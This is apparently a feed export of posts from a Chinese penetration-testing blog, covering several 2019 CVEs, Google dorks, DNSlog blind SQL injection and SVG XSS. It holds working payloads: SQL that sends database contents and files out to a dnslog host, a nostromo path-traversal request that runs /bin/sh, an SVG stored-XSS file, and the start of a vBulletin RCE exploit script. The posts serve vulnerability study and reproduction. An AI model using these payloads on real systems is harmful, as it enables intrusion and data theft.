漏洞总结</span></h2><ul><li>利用条件苛刻，因为触发漏洞的配置不是默认配置。</li><li>即使是触发漏洞的配置，仍有失败的机率，执行命令时成功率50%的样子。</li></ul><h2><span id="0x06-reference">0X06 Reference</span></h2><ul><li>参考链接：<a href="https://github.com/vkbiu/CVE/tree/master/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/vkbiu/CVE/tree/master/CVE-2019-11043</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-简介&quot;&gt;0X00 简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-cve编号&quot;&gt;0X01 CVE编号&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-漏洞威胁等级&quot;&gt;0X02 漏洞威
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="CVE-2019-16759" scheme="http://www.vkxss.top/tags/CVE-2019-16759/"/>
    
  </entry>
  
  <entry>
    <title>google_hack语法</title>
    <link href="http://www.vkxss.top/2019/10/24/google_hack%E8%AF%AD%E6%B3%95/"/>
    <id>http://www.vkxss.top/2019/10/24/google_hack语法/</id>
    <published>2019-10-24T04:25:40.000Z</published>
    <updated>2019-10-24T14:22:41.970Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="google-hack语法">google hack语法</span></h2><hr><p><b>简介</b><br>在日站的时候google搜索能让我们获得意想不到的信息，可以找到目标站点的敏感信息。后台等等</p><hr><p><b>google hack语法列表</b><br>初级语法表</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">模糊搜索-例如：卢本伟</span><br><span class="line">精确搜索-例如：<span class="string">"卢本伟"</span></span><br><span class="line">通配符*-例如：何安圻*</span><br><span class="line">通配符.-例如：大岭山中学.   PS:.的通配符用于匹配字符</span><br><span class="line">布尔逻辑-例如：大岭山中学 and 何安圻</span><br><span class="line">逻辑或|-例如：绿盟 (郑州)</span><br><span class="line">逻辑非-例如：何安圻 -博客园</span><br><span class="line">约束条件-例如：黎颖希 +获奖</span><br><span class="line">数字范围-例如：绿盟+<span class="number">2009</span>年 <span class="number">2015</span>年</span><br></pre></td></tr></table></figure><p>高级语法表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">访问基本信息-例如：info:baidu.com</span><br><span class="line">标题搜索-例如：intitle:后台登录</span><br><span class="line">正文搜索-例如：intext:身份证大全</span><br><span class="line">url搜索-例如：inurl:google.com</span><br><span class="line">锚链链接搜索-例如：inanchor:google</span><br><span class="line">文档类型限定搜索-例如：intext:身份证大全 filetype:xls</span><br><span class="line">缓存搜索-l例如：cache:secqun.org</span><br><span class="line">相关网址搜索-例如：related:google hacking</span><br><span class="line">相关连接搜索-例如：link:baidu.com</span><br><span class="line">与指定域名相关的搜索：site:baidu.com</span><br></pre></td></tr></table></figure><p>高级利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">inurl:robots.txt</span><br><span class="line">intitle:登录 intext:username inurl:login.jsp</span><br><span class="line">inurl:<span class="number">8080</span> inurl:jsp</span><br><span class="line">filetype:sql site:com <span class="keyword">and</span> <span class="string">"insert into admin 2014"</span></span><br><span class="line">inurl:jsp/demo.jsp</span><br><span class="line">inurl:update <span class="built_in">set</span> inurl:where</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;google-hack语法&quot;&gt;google hack语法&lt;/span&gt;&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;&lt;b&gt;简介&lt;/b&gt;&lt;br&gt;在日站的时候google搜索能让我们获得意想不到的信息，可以找到目标站点的敏感信息。后台等等&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;b&gt;goo
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Mysql-Dnslog盲注</title>
    <link href="http://www.vkxss.top/2019/10/21/Mysql-Dnslog%E7%9B%B2%E6%B3%A8/"/>
    <id>http://www.vkxss.top/2019/10/21/Mysql-Dnslog盲注/</id>
    <published>2019-10-21T06:25:40.000Z</published>
    <updated>2019-10-21T17:01:56.359Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-为什么用dnslog盲注">0x00 为什么用Dnslog盲注</a></li><li><a href="#0x01-利用条件">0x01 利用条件</a></li><li><a href="#0x02-如何查看mysql是否开启了文件导入导出">0x02 如何查看mysql是否开启了文件导入导出？</a></li><li><a href="#0x03-构造攻击payload">0x03 构造攻击Payload</a></li><li><a href="#0x04-reference">0X04 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-为什么用dnslog盲注">0x00 为什么用Dnslog盲注</span></h2><ul><li>对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入。<br><img src="http://pic.c1imber.top/blog/180630/8aC6fb4hHB.png?imageslim" alt></li></ul><h2><span id="0x01-利用条件">0x01 利用条件</span></h2><ul><li><p>数据库的load_file函数必须可用，也就是数据库用户必须要有file_priv权限</p></li><li><p>其次就是mysql的secure_file_priv不为NULL,有些高版本的mysql中的secure_file_priv默认为NULL</p><ul><li>secure_file_priv特性secure_file_priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</li></ul></li></ul><h2><span id="0x02-如何查看mysql是否开启了文件导入导出">0x02 如何查看mysql是否开启了文件导入导出？</span></h2><ul><li><p>在MySQL 5.5.53版本之前，这个变量默认为空，因此我们就可以使用这些函数。但是在该版本之后，NULL值会禁用这些函数。我们可使用其中的一种方法来检查这个变量的值。Secure_file_priv是一个全局变量且是一个只读变量，也就是说在运行时无法更改。</p></li><li><p>使用如下命令查看：</p><ul><li><p>mysql&gt;show global variables like ‘%secure%’;</p></li><li><p>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。</p><ul><li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下。</li><li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制。<br><img src="http://pic.c1imber.top/blog/180630/96ilB0fDlj.png?imageslim" alt></li></ul></li></ul></li></ul><ul><li><p>总结下如何修改secure_file_priv的值？</p><ul><li><p>windows下：修改my.ini 在[mysqld]内加入secure_file_priv =</p></li><li><p>linux下：修改my.cnf 在[mysqld]内加入secure_file_priv =</p></li><li><p>MYSQL新特性secure_file_priv对读写文件的影响</p></li><li><p>然后重启mysql，再查询secure_file_priv</p><p>  <img src="http://pic.c1imber.top/blog/180630/mKDHhh4j1G.png?imageslim" alt></p></li></ul></li></ul><h2><span id="0x03-构造攻击payload">0x03 构造攻击Payload</span></h2><ul><li><p>普通payload：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\\abc&apos;))</span><br><span class="line">concat是字符串拼接；</span><br><span class="line">用4个,因为\\会被转义为:\</span><br><span class="line">database()就是你要做SQL注入查询的地方</span><br><span class="line">&apos;.xxxx.ceye.io\abc&apos;就是你的dnslog平台给你的域名</span><br><span class="line">unc路径 网络共享文件方式 \\dnslog\abc这样的路径</span><br></pre></td></tr></table></figure></li></ul><pre><code>- 上面拼接的结果就是&quot;\\\\ schema_name.dnslog\\abc&quot;，其实相当于访问了带有数据库名称的三级域名，被dnslog捕获到了。</code></pre><ul><li><p>加密payload</p><ul><li><p>利用bur or select hex(“要加密的数据”)即可.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加密前：</span><br><span class="line">    select load_file(concat(&quot;\\\\&quot;,version(),&quot;.dnslog\\abc&quot;));</span><br><span class="line">16进制加密后：</span><br><span class="line">    select load_file(concat(0x5c5c5c5c,version(),0x6xxf62312e7xxb2e307xx36363xx63635c5c616263));</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/K1Xd56" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1Xd56.png" alt="K1Xd56.png"></a></p><p><a href="https://imgchr.com/i/K1XaUx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1XaUx.png" alt="K1XaUx.png"></a></p></li></ul></li><li><p>读配置文件payload</p><ul><li><p>这里构造下payload读取：C:\phpStudy\WWW\phpinfo.php</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">首先</span><br><span class="line">select hex(&apos;C:\\phpStudy\\WWW\\phpinfo.php&apos;)</span><br><span class="line">得到加密字符串:433A5C70687053747564795C5757575C706870696E666F2E706870</span><br><span class="line"></span><br><span class="line">然后构造下payload:</span><br><span class="line">select load_file(concat(0x5c5c5c5c,(select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870)),0x6f6xxxxxx6b2e307xx363xxxxxc5c616263)); //这里用了两个load_file就解决上面所说的问题了。</span><br><span class="line"></span><br><span class="line">但是你觉得会成功吗 no no no</span><br><span class="line"></span><br><span class="line">因为文件带有换行符这是不符合 域名规范的 那么我们怎么办呢 加密数据咯</span><br><span class="line">用hex() 继续构造payload:</span><br><span class="line"></span><br><span class="line">select load_file(concat(0x5c5c5c5c,hex((select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870))),0x6f6f62xxxx66b2xxx78636xxxx5c5c616263));</span><br></pre></td></tr></table></figure></li><li><p>复现如下图：</p><p>  <a href="https://imgchr.com/i/K1jCL9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1jCL9.png" alt="K1jCL9.png"></a><br>  <a href="https://imgchr.com/i/K1jpM4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1jpM4.png" alt="K1jpM4.png"></a><br>  <a href="https://imgchr.com/i/K1j9sJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1j9sJ.png" alt="K1j9sJ.png"></a></p></li></ul></li></ul><h2><span id="0x04-reference">0X04 Reference</span></h2><pre><code>- 参考链接：    https://xz.aliyun.com/t/3992#toc-1    https://www.freebuf.com/articles/web/201013.html    https://www.t00ls.net/thread-44273-1-1.html</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-为什么用dnslog盲注&quot;&gt;0x00 为什么用Dnslog盲注&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-利用条件&quot;&gt;0x01 利用条件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x0
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>nostromo nhttpd 路径遍历漏洞</title>
    <link href="http://www.vkxss.top/2019/10/17/CVE-2019-16278/"/>
    <id>http://www.vkxss.top/2019/10/17/CVE-2019-16278/</id>
    <published>2019-10-17T07:30:08.000Z</published>
    <updated>2019-10-17T07:32:00.814Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-简介">0X00 简介</a></li><li><a href="#0x01-cve编号">0X01 CVE编号</a></li><li><a href="#0x02-漏洞威胁等级">0X02 漏洞威胁等级</a></li><li><a href="#0x03-影响范围">0X03 影响范围</a></li><li><a href="#0x04-漏洞描述">0X04 漏洞描述</a></li><li><a href="#0x05-漏洞poc">0X05 漏洞POC</a></li><li><a href="#0x06-漏洞复现">0X06 漏洞复现</a></li><li><a href="#0x07-修复建议">0X07 修复建议</a></li><li><a href="#0x08-reference">0X08 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-简介">0X00 简介</span></h2><ul><li><font face="微软雅黑">nostromo nhttpd是一款开源的Web服务器。 nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。</font></li></ul><h2><span id="0x01-cve编号">0X01 CVE编号</span></h2><ul><li><font face="微软雅黑">CVE-2019-16278</font></li></ul><h2><span id="0x02-漏洞威胁等级">0X02 漏洞威胁等级</span></h2><ul><li>高危</li></ul><h2><span id="0x03-影响范围">0X03 影响范围</span></h2><ul><li>nostromo nhttpd &lt;= 1.9.6</li></ul><h2><span id="0x04-漏洞描述">0X04 漏洞描述</span></h2><ul><li><font face="微软雅黑">nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。</font></li></ul><h2><span id="0x05-漏洞poc">0X05 漏洞POC</span></h2><ul><li><p>CVE-2019-16278.sh</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">   echo</span><br><span class="line">   echo</span><br><span class="line">   ifconfig 2&gt;&amp;1</span><br></pre></td></tr></table></figure></li></ul><h2><span id="0x06-漏洞复现">0X06 漏洞复现</span></h2><ul><li><p>记录一下，请参考：</p><ul><li><a href="https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278" target="_blank" rel="noopener">https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278</a></li></ul></li></ul><h2><span id="0x07-修复建议">0X07 修复建议</span></h2><ul><li><font face="微软雅黑">上waf或防火墙配置规则拦截,等待官方修复打补丁。</font></li></ul><h2><span id="0x08-reference">0X08 Reference</span></h2><ul><li><p>参考链接：</p><ul><li><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807" target="_blank" rel="noopener">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807</a></li><li><a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits" target="_blank" rel="noopener">https://git.sp0re.sh/sp0re/Nhttpd-exploits</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-简介&quot;&gt;0X00 简介&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-cve编号&quot;&gt;0X01 CVE编号&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-漏洞威胁等级&quot;&gt;0X02 漏洞威
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="CVE-2019-16278" scheme="http://www.vkxss.top/tags/CVE-2019-16278/"/>
    
  </entry>
  
  <entry>
    <title>接口快速测试小技巧(Python)</title>
    <link href="http://www.vkxss.top/2019/10/11/%E6%8E%A5%E5%8F%A3%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7(Python)/"/>
    <id>http://www.vkxss.top/2019/10/11/接口快速测试小技巧(Python)/</id>
    <published>2019-10-11T07:30:08.000Z</published>
    <updated>2019-10-16T02:30:11.452Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="接口快速测试小技巧python">接口快速测试小技巧(Python)</span></h2><ul><li><p><font face="微软雅黑">终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，不只是支持python，而且还支持多种编程语言转换。🐂🍺</font></p></li><li><p><font face="微软雅黑">网站：<a href="https://curl.trillworks.com" target="_blank" rel="noopener">https://curl.trillworks.com</a></font></p><p>  <a href="https://imgchr.com/i/KieFSA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/16/KieFSA.png" alt="KieFSA.png"></a></p><p>  <a href="https://imgchr.com/i/KieEOP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/16/KieEOP.png" alt="KieEOP.png"></a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;接口快速测试小技巧python&quot;&gt;接口快速测试小技巧(Python)&lt;/span&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;font face=&quot;微软雅黑&quot;&gt;终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，
      
    
    </summary>
    
    
      <category term="python" scheme="http://www.vkxss.top/categories/python/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SVG-XSS</title>
    <link href="http://www.vkxss.top/2019/10/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SVG-XSS/"/>
    <id>http://www.vkxss.top/2019/10/11/渗透测试-SVG-XSS/</id>
    <published>2019-10-11T07:30:08.000Z</published>
    <updated>2019-10-11T10:38:58.307Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#svg-xss">SVG-XSS</a><ul><li><a href="#介绍">介绍</a></li><li><a href="#svg文件">SVG文件</a></li><li><a href="#xss-payload">Xss Payload</a></li></ul></li></ul><!-- tocstop --><h1><span id="svg-xss">SVG-XSS</span></h1><h2><span id="介绍">介绍</span></h2><ul><li>跨站点脚本（XSS）是一个非常常见的漏洞，涉及在网页中注入javascript代码。从窃取用户Cookie到通过CORS绕过SOP，此漏洞可用于执行各种操作。有许多方法可以定位XSS漏洞，通常会忽略SVG文件。</li></ul><h2><span id="svg文件">SVG文件</span></h2><ul><li><p>可缩放矢量图形（SVG）是用于二维图形的基于XML的矢量图像格式，并支持交互性和动画。</p></li><li><p>以下代码是基本SVG文件的示例：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li><li><p>SVG文件还支持嵌入式javascript代码。例如，开发人员可能在svg图像中使用javascript，以便他们可以实时进行操作。这可以用于动画和其他任务。</p></li><li><p>要注意的另一件事是，SVG文件可以视为HTML中的图像。这意味着您可以将SVG文件放置在图像标签中，并且可以完美呈现：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;rectangle.svg&quot; alt=&quot;Rectangle&quot; height=&quot;42&quot; width=&quot;42&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><h2><span id="xss-payload">Xss Payload</span></h2><ul><li><p>如果网站使用XSS有效负载加载SVG文件，则将执行该文件。开发人员和攻击者都经常忽视这一点。以下是带有警报XSS有效负载的SVG文件示例：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    alert(&quot;SVG XSS&quot;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li><li><p>上传时，注意内容类型设置为：Content-Type: image/svg+xml</p></li><li><p>上传图像后，您只需找出图像上载到的路径即可。如果您使用的是Google chrome，则可以通过右键单击图片并选择“复制图片地址”来轻松完成此操作。如果在查看图像时一切正常，则将执行有效负载。您只是通过SVG文件存储了XSS。<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H0dbdab236e1c460ebd3f3fe412c09d94k.png" style="zoom:50%"></center></font></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#svg-xss&quot;&gt;SVG-XSS&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#介绍&quot;&gt;介绍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#svg文件&quot;&gt;SVG文件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#xs
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-13272-Linux本地提权漏洞</title>
    <link href="http://www.vkxss.top/2019/10/08/CVE-2019-13272/"/>
    <id>http://www.vkxss.top/2019/10/08/CVE-2019-13272/</id>
    <published>2019-10-08T07:30:08.000Z</published>
    <updated>2019-10-09T08:00:57.618Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#漏洞概述">漏洞概述：</a></li><li><a href="#影响范围">影响范围</a></li><li><a href="#复现环境">复现环境</a></li><li><a href="#漏洞复现">漏洞复现</a></li></ul><!-- tocstop --><h2><span id="漏洞概述">漏洞概述：</span></h2><ul><li><p>当调用PTRACE_TRACEME时，ptrace_link函数将获得对父进程凭据的RCU引用，然后将该指针指向get_cred函数。但是，对象struct cred的生存周期规则不允许无条件地将RCU引用转换为稳定引用。</p></li><li><p>PTRACE_TRACEME获取父进程的凭证，使其能够像父进程一样执行父进程能够执行的各种操作。如果恶意低权限子进程使用PTRACE_TRACEME并且该子进程的父进程具有高权限，该子进程可获取其父进程的控制权并且使用其父进程的权限调用execve函数创建一个新的高权限进程。攻击者最终控制具有高权限的两个进程ptrace关系，可以被用来ptrace，suid二进制文件并获得root权限。</p></li></ul><h2><span id="影响范围">影响范围</span></h2><ul><li>目前受影响的Linux内核版本：<ul><li>Linux Kernel &lt; 5.1.17</li></ul></li></ul><h2><span id="复现环境">复现环境</span></h2><ul><li><p>exploit下载地址：</p><ul><li><a href="https://github.com/vkbiu/CVE/tree/master/CVE-2019-13272" target="_blank" rel="noopener">https://github.com/vkbiu/CVE/tree/master/CVE-2019-13272</a></li></ul></li><li><p>Ubuntu 4.13.0-38-generic</p></li><li><p>Kali未复现成功，普通用户执行gcc，提示权限不够</p></li></ul><h2><span id="漏洞复现">漏洞复现</span></h2><ul><li>利用效果如下图:<br><font face="微软雅黑"><center><img src="https://ae01.alicdn.com/kf/H12304057103645d3ba5553aa6f065726i.png" style="zoom:50%"></center></font></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#漏洞概述&quot;&gt;漏洞概述：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#影响范围&quot;&gt;影响范围&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#复现环境&quot;&gt;复现环境&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#漏洞复现
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="Linux本地提取" scheme="http://www.vkxss.top/tags/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>vBulletin 5.x 前台远程代码执行漏洞复现</title>
    <link href="http://www.vkxss.top/2019/09/25/CVE-2019-16759/"/>
    <id>http://www.vkxss.top/2019/09/25/CVE-2019-16759/</id>
    <published>2019-09-25T07:30:08.000Z</published>
    <updated>2019-09-25T16:45:55.068Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-简介">0X00 简介</a></li><li><a href="#0x01-cve编号">0X01 CVE编号</a></li><li><a href="#0x02-漏洞威胁等级">0X02 漏洞威胁等级</a></li><li><a href="#0x03-影响范围">0X03 影响范围</a></li><li><a href="#0x04-漏洞描述">0X04 漏洞描述</a></li><li><a href="#0x05-漏洞poc">0X05 漏洞POC</a></li><li><a href="#0x06-漏洞复现">0X06 漏洞复现</a></li><li><a href="#0x07-修复建议">0X07 修复建议</a></li><li><a href="#0x08-reference">0X08 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-简介">0X00 简介</span></h2><ul><li>vBulletin 是一个商用的论坛程序，在全球拥有数万用户且增长速度很快。该论坛采用PHP Web语言及MySQL数据库的方式进行架构。《财富》 500强和Alexa排名前100万的公司网站大部分都在使用的一款互联网论坛程序。</li></ul><h2><span id="0x01-cve编号">0X01 CVE编号</span></h2><ul><li>CVE-2019-16759</li><li>相关信息链接：<a href="https://seclists.org/fulldisclosure/2019/Sep/31" target="_blank" rel="noopener">https://seclists.org/fulldisclosure/2019/Sep/31</a></li></ul><h2><span id="0x02-漏洞威胁等级">0X02 漏洞威胁等级</span></h2><ul><li>高危</li></ul><h2><span id="0x03-影响范围">0X03 影响范围</span></h2><ul><li>CVE-2019-16759漏洞影响：vBulletin 5.0.0 到最新 5.5.4版本</li></ul><h2><span id="0x04-漏洞描述">0X04 漏洞描述</span></h2><ul><li>漏洞通过请求ajax/render/widget_php进行模板注入触发代码执行。</li></ul><h2><span id="0x05-漏洞poc">0X05 漏洞POC</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#</span><br><span class="line"># vBulletin 5.x 0day pre-auth RCE exploit</span><br><span class="line"># </span><br><span class="line"># This should work on all versions from 5.0.0 till 5.5.4</span><br><span class="line">#</span><br><span class="line"># Google Dorks:</span><br><span class="line"># - site:*.vbulletin.net</span><br><span class="line"># - &quot;Powered by vBulletin Version 5.5.4&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 2:</span><br><span class="line">    sys.exit(&quot;Usage: %s &lt;URL to 